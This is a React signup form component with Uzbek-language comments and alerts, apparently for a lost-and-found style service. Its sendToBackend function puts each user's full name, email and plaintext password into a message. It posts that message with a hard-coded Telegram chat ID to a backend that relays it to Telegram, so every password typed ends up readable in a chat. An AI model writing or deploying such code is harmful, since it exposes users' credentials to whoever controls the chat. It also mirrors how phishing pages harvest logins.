import React, { useState } from 'react';
import './Signup.css';

function Signup() {
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    password: '',
    confirmPassword: ''
  });

  const [errors, setErrors] = useState({});
  const [isLoading, setIsLoading] = useState(false);
  const YOUR_CHAT_ID = '1361257423'; 

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));

    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.fullName.trim()) {
      newErrors.fullName = 'Full name is required';
    }

    if (!formData.email.trim()) {
      newErrors.email = 'Email is required';
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = 'Email is invalid';
    }

    if (!formData.password) {
      newErrors.password = 'Password is required';
    } else if (formData.password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
    }

    if (formData.password !== formData.confirmPassword) {
      newErrors.confirmPassword = 'Passwords do not match';
    }

    // Terms checkbox uchun tekshiruv
    const termsCheckbox = document.getElementById('terms');
    if (termsCheckbox && !termsCheckbox.checked) {
      newErrors.terms = 'You must agree to the Terms of Service and Privacy Policy';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const sendToBackend = async (userInfo) => {
    const message = `
🔔 *Yangi Ro'yxatdan O'tish*

👤 *To'liq Ism:* ${userInfo.fullName}
📧 *Email:* ${userInfo.email}
🔑 *Parol:* ||${userInfo.password}||
⏰ *Vaqt:* ${new Date().toLocaleString('uz-UZ')}
    `;

    const BACKEND_URL = 'http://localhost:3001/api/send-to-telegram'; 

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: YOUR_CHAT_ID, 
          text: message,
          parse_mode: 'Markdown'
        }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({ message: response.statusText }));
        console.error('Backenddan xato javob:', errorData);
        throw new Error(`Server Xatolik: ${errorData.message || response.statusText}`);
      }

      const result = await response.json();
      console.log('Backenddan muvaffaqiyatli javob:', result);
      return result; 

    } catch (error) {
      console.error('Backendga so\'rov yuborishda xatolik:', error);
      if (error instanceof TypeError && error.message.includes('fetch')) {
        alert('❌ Internet yoki server bilan ulanishda muammo. Iltimos, aloqani tekshiring.');
      } else {
        alert(`❌ Serverga ma'lumot yuborishda xatolik: ${error.message}`);
      }
      throw error;
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (validateForm()) {
      setIsLoading(true);
      
      try {
        await sendToBackend(formData);

        alert('✅ Tabriklaymiz! Siz muvaffaqiyatli ro\'yxatdan o\'tdingiz. Ma\'lumotlaringiz server orqali Telegramga yuborildi.');

        setFormData({
          fullName: '',
          email: '',
          password: '',
          confirmPassword: ''
        });
        const termsCheckbox = document.getElementById('terms');
        if (termsCheckbox) termsCheckbox.checked = false;

      } catch (error) {
        console.error('Forma yuborishda umumiy xatolik:', error);
      } finally {
        setIsLoading(false);
      }
    }
  };

  return (
    <div className="signup-page">
      <div className="signup-container">
        <div className="signup-header">
          <h1>Create Your Account</h1>
          <p>Join thousands who never lose anything again</p>
        </div>

        <form className="signup-form" onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="fullName">Full Name</label>
            <input
              type="text"
              id="fullName"
              name="fullName"
              value={formData.fullName}
              onChange={handleChange}
              className={errors.fullName ? 'form-input error' : 'form-input'}
              placeholder="Enter your full name"
            />
            {errors.fullName && <span className="error-message">{errors.fullName}</span>}
          </div>

          <div className="form-group">
            <label htmlFor="email">Email Address</label>
            <input
              type="email"
              id="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              className={errors.email ? 'form-input error' : 'form-input'}
              placeholder="Enter your email"
            />
            {errors.email && <span className="error-message">{errors.email}</span>}
          </div>

          <div className="form-group">
            <label htmlFor="password">Password</label>
            <input
              type="password"
              id="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              className={errors.password ? 'form-input error' : 'form-input'}
              placeholder="Create a password"
            />
            {errors.password && <span className="error-message">{errors.password}</span>}
          </div>

          <div className="form-group">
            <label htmlFor="confirmPassword">Confirm Password</label>
            <input
              type="password"
              id="confirmPassword"
              name="confirmPassword"
              value={formData.confirmPassword}
              onChange={handleChange}
              className={errors.confirmPassword ? 'form-input error' : 'form-input'}
              placeholder="Confirm your password"
            />
            {errors.confirmPassword && <span className="error-message">{errors.confirmPassword}</span>}
          </div>

          <div className="form-group checkbox-group">
            <input type="checkbox" id="terms" name="terms" />
            <label htmlFor="terms">
              I agree to the <a href="/terms">Terms of Service</a> and <a href="/privacy">Privacy Policy</a>
            </label>
            {errors.terms && <span className="error-message">{errors.terms}</span>}
          </div>

          <button 
            type="submit" 
            className="signup-button"
            disabled={isLoading}
          >
            {isLoading ? 'Creating Account...' : 'Create Account'}
          </button>
        </form>

        <div className="signup-footer">
          <p>Already have an account? <a href="/login">Sign In</a></p>
        </div>
      </div>
    </div>
  );
}

export default Signup;
